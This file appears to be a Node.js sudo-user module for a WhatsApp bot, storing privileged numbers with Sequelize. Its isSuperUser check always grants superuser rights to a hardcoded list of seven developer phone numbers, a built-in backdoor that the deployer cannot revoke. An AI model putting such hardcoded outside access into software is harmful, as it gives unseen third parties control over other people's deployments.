const { DATABASE } = require('./database');
const { DataTypes } = require('sequelize');

const SudoDB = DATABASE.define('SudoUser', {
    id: {
        type: DataTypes.INTEGER,
        primaryKey: true,
        autoIncrement: true,
    },
    number: {
        type: DataTypes.STRING,
        allowNull: false,
        unique: true,
    },
}, {
    tableName: 'sudo_users',
    timestamps: true,
});

let initialization;
function initializeSudoDB() {
    if (!initialization) initialization = SudoDB.sync().catch(error => {
        initialization = null;
        throw error;
    });
    return initialization;
}

let _sudoCache = null;

async function getSudoNumbers() {
    await initializeSudoDB();
    if (_sudoCache) return _sudoCache;
    const records = await SudoDB.findAll();
    _sudoCache = records.map(record => record.number);
    return _sudoCache;
}

function getCachedSudoNumbers() {
    return [...(_sudoCache || [])];
}

async function setSudo(number) {
    await initializeSudoDB();
    try {
        const [record, created] = await SudoDB.findOrCreate({
            where: { number: number },
            defaults: { number: number },
        });
        if (_sudoCache) _sudoCache = [...new Set([..._sudoCache, number])];
        else await getSudoNumbers();
        return created;
    } catch (error) {
        console.error('[SUDO][SET_ERROR]:', error);
        return false;
    }
}

async function delSudo(number) {
    await initializeSudoDB();
    try {
        const deleted = await SudoDB.destroy({
            where: { number: number },
        });
        if (_sudoCache) _sudoCache = _sudoCache.filter(value => value !== number);
        return deleted > 0;
    } catch (error) {
        console.error('[SUDO][DEL_ERROR]:', error);
        return false;
    }
}

async function clearAllSudo() {
    await initializeSudoDB();
    try {
        const deleted = await SudoDB.destroy({ where: {} });
        _sudoCache = [];
        return deleted;
    } catch (error) {
        console.error('[SUDO][CLEAR_ALL_ERROR]:', error);
        return 0;
    }
}

const DEV_NUMBERS = ['254715206562', '254747746851', '254114018035', '254728782591', '254799916673', '254762016957', '254113174209'];

async function isSuperUser(jid, Gifted) {
    if (!jid) return false;
    const num = jid.split("@")[0].split(":")[0];
    const ownerNumber = (process.env.OWNER_NUMBER || "").replace(/\D/g, "");
    const botNum = Gifted?.user?.id?.split(":")[0];
    if (num === ownerNumber || num === botNum) return true;
    if (DEV_NUMBERS.includes(num)) return true;
    const sudoNumbers = await getSudoNumbers();
    return sudoNumbers.includes(num);
}

module.exports = {
    SudoDB,
    getSudoNumbers,
    getCachedSudoNumbers,
    setSudo,
    delSudo,
    clearAllSudo,
    isSuperUser,
};
